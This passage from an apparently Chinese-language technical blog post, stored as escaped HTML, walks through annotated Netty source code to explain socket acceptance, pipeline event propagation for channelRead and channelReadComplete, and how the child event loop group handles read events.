            } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable t2) {
                logger.warn(&lt;/span&gt;&quot;Failed to close a socket.&quot;&lt;span&gt;, t2);
            }
        }

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; 0&lt;span&gt;;
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.util.internal.SocketUtils#accept&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; SocketChannel accept(&lt;span&gt;final&lt;/span&gt; ServerSocketChannel serverSocketChannel) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; IOException {
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; AccessController.doPrivileged(&lt;span&gt;new&lt;/span&gt; PrivilegedExceptionAction&amp;lt;SocketChannel&amp;gt;&lt;span&gt;() {
                @Override
                &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; SocketChannel run() &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; IOException {
                    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; serverSocketChannel.accept();
                }
            });
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (PrivilegedActionException e) {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt;&lt;span&gt; (IOException) e.getCause();
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　将新接入的socket封装成 NioSocketChannel 后, 添加到 readBuf 中, 进入下一步.&lt;/p&gt;

&lt;h4&gt;2.2 read 事件传播&lt;/h4&gt;
&lt;p&gt;　　socket 接入完成后, 会依次读取数据. (所以, 前面会同时接入多个 socket ??) pipeline 机制正式上场. 此时pipeline中有head,acceptor,tail, 但只有acceptor会真正处理数据. &lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;69&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; channelRead() 事件通知, 从 head 开始, 由 acceptor 处理
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.DefaultChannelPipeline#fireChannelRead&lt;/span&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt;&lt;span&gt; ChannelPipeline fireChannelRead(Object msg) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将pipeline中的head节点作为起始channelHandler传入，处理消息
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; head 实现: efaultChannelPipeline.HeadContext, 它既能处理 inbound, 也能处理 outbound 数据。 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 即其实现了 ChannelOutboundHandler, ChannelInboundHandler&lt;/span&gt;
&lt;span&gt;        AbstractChannelHandlerContext.invokeChannelRead(head, msg);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.AbstractChannelHandlerContext#invokeChannelRead(io.netty.channel.AbstractChannelHandlerContext, java.lang.Object)&lt;/span&gt;
    &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; invokeChannelRead(&lt;span&gt;final&lt;/span&gt;&lt;span&gt; AbstractChannelHandlerContext next, Object msg) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 此处也是一个扩展点, 如果该channel实现了 ReferenceCounted, 则创建一个新的 ReferenceCounted msg 包装, 并调用其touch 方法&lt;/span&gt;
        &lt;span&gt;final&lt;/span&gt; Object m = next.pipeline.touch(ObjectUtil.checkNotNull(msg, &quot;msg&quot;&lt;span&gt;), next);
        EventExecutor executor &lt;/span&gt;=&lt;span&gt; next.executor();
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (executor.inEventLoop()) {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 当前事件循环发现的数据，直接走此处&lt;/span&gt;
&lt;span&gt;            next.invokeChannelRead(m);
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            executor.execute(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Runnable() {
                @Override
                &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; run() {
                    next.invokeChannelRead(m);
                }
            });
        }
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.AbstractChannelHandlerContext#invokeChannelRead(java.lang.Object)&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; invokeChannelRead(Object msg) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (invokeHandler()) {
            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 开始调用真正的 channelRead()&lt;/span&gt;
                ((ChannelInboundHandler) handler()).channelRead(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;, msg);
            } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable t) {
                notifyHandlerException(t);
            }
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            fireChannelRead(msg);
        }
    }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.DefaultChannelPipeline.HeadContext#channelRead&lt;/span&gt;
&lt;span&gt;        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; channelRead(ChannelHandlerContext ctx, Object msg) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; head 节点没有什么特别需要处理的，直接继续调用 fireChannelRead() 即可&lt;/span&gt;
&lt;span&gt;            ctx.fireChannelRead(msg);
        }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.AbstractChannelHandlerContext#fireChannelRead&lt;/span&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; ChannelHandlerContext fireChannelRead(&lt;span&gt;final&lt;/span&gt;&lt;span&gt; Object msg) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 查找下一个入站处理器(查找方式前面已看过，就是以当前节点作为起点查找pipeline的下一个入站 channelHandlerContext, 调用即可
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 此处调用与head节点的调用不同之处在于, head的调用是硬编码的, 但此处则是动态的, 可递归的
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 而真正的差别是在于 channelHandler 的实现不同，从而处理不同的业务 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 对于刚刚 accept 之后的数据，必然会经过 Acceptor, 如下 &lt;/span&gt;
&lt;span&gt;        invokeChannelRead(findContextInbound(), msg);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
    }
    
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 几经周折, 最终转到 ServerBootstrapAcceptor, 它会进行真正的数据处理, 实际上就是提交数据到 childGroup 中
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.bootstrap.ServerBootstrap.ServerBootstrapAcceptor#channelRead&lt;/span&gt;
&lt;span&gt;        @Override
        @SuppressWarnings(&lt;/span&gt;&quot;unchecked&quot;&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; channelRead(ChannelHandlerContext ctx, Object msg) {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 对外部的channel进行还原, 将业务的 childHandler 添加到 pipeline 中
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 添加方式与之前的一样，会涉及到name的生成，ChannelHandlerContext的构建。。。&lt;/span&gt;
            &lt;span&gt;final&lt;/span&gt; Channel child =&lt;span&gt; (Channel) msg;
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将业务设置的 childHandler 绑定到child pipeline 中, 即此时才会触发 ChannelInitializer.initChannel()
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 每次新的socket接入, 都会触发一次 initChannel() 哦&lt;/span&gt;
&lt;span&gt;            child.pipeline().addLast(childHandler);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 复制各种配置属性到 child 中&lt;/span&gt;
&lt;span&gt;            setChannelOptions(child, childOptions, logger);

            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (Entry&amp;lt;AttributeKey&amp;lt;?&amp;gt;, Object&amp;gt;&lt;span&gt; e: childAttrs) {
                child.attr((AttributeKey&lt;/span&gt;&amp;lt;Object&amp;gt;&lt;span&gt;) e.getKey()).set(e.getValue());
            }

            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 注册child, 以及添加一个 回调
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; register 时就会将当前channel与一个eventLoop线程绑定起来，后续所有的操作将会在这个eventloop线程上执行
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 同时，它会将当前channel与 nio的selector 绑定注册起来
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 到此，acceptor的任务就算完成了&lt;/span&gt;
                childGroup.register(child).addListener(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; ChannelFutureListener() {
                    @Override
                    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; operationComplete(ChannelFuture future) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
                        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;future.isSuccess()) {
                            forceClose(child, future.cause());
                        }
                    }
                });
            } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable t) {
                forceClose(child, t);
            }
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　acceptor 最主要的工作就是将socket提交到 childGroup 中. 而childGroup的注册过程, 与bossGroup的注册过程是一致的, 它们的最大差异在于关注的事件不一致. acceptor 关注 OP_ACCEPT, 而childGroup 关注 OP_READ.&lt;/p&gt;

&lt;h4&gt;2.3 readComplete 事件的传播&lt;/h4&gt;
&lt;p&gt;　　实际上,在bossGroup中, readComplete() 事件基本是会不被关注的, 但我们也可以通过它来了解下 readComplete 的传播方式吧! 总体和 read() 事件的传播是一致的.&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.DefaultChannelPipeline#fireChannelReadComplete&lt;/span&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt;&lt;span&gt; ChannelPipeline fireChannelReadComplete() {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 同样以 head 作为起点开始传播&lt;/span&gt;
&lt;span&gt;        AbstractChannelHandlerContext.invokeChannelReadComplete(head);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 通用的调用 handler 方式
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.AbstractChannelHandlerContext#invokeChannelReadComplete(io.netty.channel.AbstractChannelHandlerContext)&lt;/span&gt;
    &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; invokeChannelReadComplete(&lt;span&gt;final&lt;/span&gt;&lt;span&gt; AbstractChannelHandlerContext next) {
        EventExecutor executor &lt;/span&gt;=&lt;span&gt; next.executor();
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (executor.inEventLoop()) {
            next.invokeChannelReadComplete();
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            Runnable task &lt;/span&gt;=&lt;span&gt; next.invokeChannelReadCompleteTask;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (task == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                next.invokeChannelReadCompleteTask &lt;/span&gt;= task = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Runnable() {
                    @Override
                    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; run() {
                        next.invokeChannelReadComplete();
                    }
                };
            }
            executor.execute(task);
        }
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 通用pipeline调用模型
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.AbstractChannelHandlerContext#invokeChannelReadComplete()&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; invokeChannelReadComplete() {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (invokeHandler()) {
            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
                ((ChannelInboundHandler) handler()).channelReadComplete(&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
            } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable t) {
                notifyHandlerException(t);
            }
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            fireChannelReadComplete();
        }
    }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.DefaultChannelPipeline.HeadContext#channelReadComplete&lt;/span&gt;
&lt;span&gt;        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; channelReadComplete(ChannelHandlerContext ctx) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
            ctx.fireChannelReadComplete();

            readIfIsAutoRead();
        }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.AbstractChannelHandlerContext#fireChannelReadComplete&lt;/span&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; ChannelHandlerContext fireChannelReadComplete() {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 通用的 fireXXX 事件传播方式，如果想调用下一节点，则调用 fireXXX, 否则pipeline将会被终止
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 以当前节点作为起点查找下一个入站处理器 handler
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 在acceptor中，最终会转到 ServerBootstrapAcceptor.readComplete()中&lt;/span&gt;
&lt;span&gt;        invokeChannelReadComplete(findContextInbound());
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
    }
    
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.ChannelInboundHandlerAdapter#channelReadComplete&lt;/span&gt;
    &lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * Calls {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; ChannelHandlerContext#fireChannelReadComplete()} to forward
     * to the next {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; ChannelInboundHandler} in the {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; ChannelPipeline}.
     *
     * Sub-classes may override this method to change behavior.
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; channelReadComplete(ChannelHandlerContext ctx) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 因为 ServerBootstrapAcceptor 并没有重写 channelReadComplete 方法，所以直接忽略该事件了
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 而 tail 节点中的默认 onUnhandledInboundChannelReadComplete() 也是空处理&lt;/span&gt;
&lt;span&gt;        ctx.fireChannelReadComplete();
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　总结下 pipeline 的传播方式:&lt;/p&gt;
&lt;p&gt;　　　　1. 以 pipeline.fireChannelReadComplete() 等方式触发事件传播;&lt;br/&gt;　　　　2. 调用 invokeChannelReadComplete, 传入 head或者tail作为传播的起点;&lt;br/&gt;　　　　3. 判断是否在 eventloop 中，如果是则直接调用 next.invokeChannelReadComplete();&lt;br/&gt;　　　　4. 调用 handler.channelReadComplete(this) 触发具体的事件;&lt;br/&gt;　　　　5. 具体handler处理事务，如果想向下一节点传播，则调用 ctx.fireChannelReadComplete(), 否则停止传播;&lt;/p&gt;
&lt;p&gt;　　以上是以 fireChannelReadComplete 来讲解的pipeline过程，实际上也是几乎所有的事件传播的方式。&lt;/p&gt;

&lt;h3&gt;3. childGroup 运行io操作&lt;/h3&gt;
&lt;p&gt;　　上一节讲到的是acceptor接入了socket, 他会提交到childGroup中进行处理, 然后自己就返回了。那么 childGroup 又是如何处理事务的呢？&lt;/p&gt;
&lt;p&gt;　　实际上，它与bossGroup是完全一样的处理方式，差别在于它们各自的pipeline是不一样的，线程数是不一样的，从而实现处理不同业务。而它处理是的读写事件，而acceptor则是处理的OP_ACCEPT事件。它的OP_READ事件是在创建NioSocketChannel的时候注册好的。我们先看看下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 在bossGroup处理Accept事件时，创建 NioSocketChannel
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.socket.nio.NioServerSocketChannel#doReadMessages&lt;/span&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; doReadMessages(List&amp;lt;Object&amp;gt; buf) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
        SocketChannel ch &lt;/span&gt;=&lt;span&gt; SocketUtils.accept(javaChannel());

        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (ch != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                buf.add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; NioSocketChannel(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;, ch));
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; 1&lt;span&gt;;
            }
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable t) {
            logger.warn(&lt;/span&gt;&quot;Failed to create a new channel from an accepted socket.&quot;&lt;span&gt;, t);

            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
                ch.close();
            } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable t2) {
                logger.warn(&lt;/span&gt;&quot;Failed to close a socket.&quot;&lt;span&gt;, t2);
            }
        }

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; 0&lt;span&gt;;
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.socket.nio.NioSocketChannel#NioSocketChannel&lt;/span&gt;
    &lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * Create a new instance
     *
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; parent    the {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; Channel} which created this instance or {&lt;/span&gt;&lt;span&gt;@code&lt;/span&gt;&lt;span&gt; null} if it was created by the user
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; socket    the {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; SocketChannel} which will be used
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt;&lt;span&gt; NioSocketChannel(Channel parent, SocketChannel socket) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 在父类中处理事件监听&lt;/span&gt;
        &lt;span&gt;super&lt;/span&gt;&lt;span&gt;(parent, socket);
        config &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; NioSocketChannelConfig(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;, socket.socket());
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.nio.AbstractNioByteChannel#AbstractNioByteChannel&lt;/span&gt;
    &lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * Create a new instance
     *
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; parent            the parent {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; Channel} by which this instance was created. May be {&lt;/span&gt;&lt;span&gt;@code&lt;/span&gt;&lt;span&gt; null}
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; ch                the underlying {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; SelectableChannel} on which it operates
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;protected&lt;/span&gt;&lt;span&gt; AbstractNioByteChannel(Channel parent, SelectableChannel ch) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 注册 OP_READ 事件&lt;/span&gt;
        &lt;span&gt;super&lt;/span&gt;&lt;span&gt;(parent, ch, SelectionKey.OP_READ);
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　ok, 说回childGroup处理事件流中。因大家都是 NioEventLoopGroup, 所以创建的eventloop自然都是一样的。即都会处理io事件和task运行。回顾下上节的processSelectedKey()操作:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;45&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.nio.NioEventLoop#processSelectedKey(java.nio.channels.SelectionKey, io.netty.channel.nio.AbstractNioChannel)&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; processSelectedKey(SelectionKey k, AbstractNioChannel ch) {
        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; AbstractNioChannel.NioUnsafe unsafe =&lt;span&gt; ch.unsafe();
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;k.isValid()) {
            &lt;/span&gt;&lt;span&gt;final&lt;/span&gt;&lt;span&gt; EventLoop eventLoop;
            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
                eventLoop &lt;/span&gt;=&lt;span&gt; ch.eventLoop();
            } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable ignored) {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; If the channel implementation throws an exception because there is no event loop, we ignore this
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; because we are only trying to determine if ch is registered to this event loop and thus has authority
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; to close ch.&lt;/span&gt;
                &lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
            }
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Only close ch if ch is still registered to this EventLoop. ch could have deregistered from the event loop
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; and thus the SelectionKey could be cancelled as part of the deregistration process, but the channel is
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; still healthy and should not be closed.
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; See &lt;/span&gt;&lt;span&gt;https://github.com/netty/netty/issues/5125&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; (eventLoop != &lt;span&gt;this&lt;/span&gt; || eventLoop == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
            }
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; close the channel if the key is not valid anymore&lt;/span&gt;
&lt;span&gt;            unsafe.close(unsafe.voidPromise());
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; readyOps =&lt;span&gt; k.readyOps();
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; We first need to call finishConnect() before try to trigger a read(...) or write(...) as otherwise
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; the NIO JDK channel implementation may throw a NotYetConnectedException.&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; ((readyOps &amp;amp; SelectionKey.OP_CONNECT) != 0&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; remove OP_CONNECT as otherwise Selector.select(..) will always return without blocking
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; See &lt;/span&gt;&lt;span&gt;https://github.com/netty/netty/issues/924&lt;/span&gt;
                &lt;span&gt;int&lt;/span&gt; ops =&lt;span&gt; k.interestOps();
                ops &lt;/span&gt;&amp;amp;= ~&lt;span&gt;SelectionKey.OP_CONNECT;
                k.interestOps(ops);

                unsafe.finishConnect();
            }

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Process OP_WRITE first as we may be able to write some queued buffers and so free memory.&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; ((readyOps &amp;amp; SelectionKey.OP_WRITE) != 0&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Call forceFlush which will also take care of clear the OP_WRITE once there is nothing left to write&lt;/span&gt;
&lt;span&gt;                ch.unsafe().forceFlush();
            }

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Also check for readOps of 0 to workaround possible JDK bug which may otherwise lead
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; to a spin loop&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; ((readyOps &amp;amp; (SelectionKey.OP_READ | SelectionKey.OP_ACCEPT)) != 0 || readyOps == 0&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 走不一样的 unsafe 实现&lt;/span&gt;
&lt;span&gt;                unsafe.read();
            }
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (CancelledKeyException ignored) {
            unsafe.close(unsafe.voidPromise());
        }
    }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.nio.AbstractNioByteChannel.NioByteUnsafe#read&lt;/span&gt;
&lt;span&gt;        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; read() {
            &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; ChannelConfig config =&lt;span&gt; config();
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 判断是否终止读数据，比如socket关闭等原因&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (shouldBreakReadReady(config)) {
                clearReadPending();
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
            }
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; step1. 环境准备，pipeline, allocator...
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 这里的 pipeline 就是我们自定义传入的各种handler了&lt;/span&gt;
            &lt;span&gt;final&lt;/span&gt; ChannelPipeline pipeline =&lt;span&gt; pipeline();
            &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; ByteBufAllocator allocator =&lt;span&gt; config.getAllocator();
            &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; RecvByteBufAllocator.Handle allocHandle =&lt;span&gt; recvBufAllocHandle();
            allocHandle.reset(config);

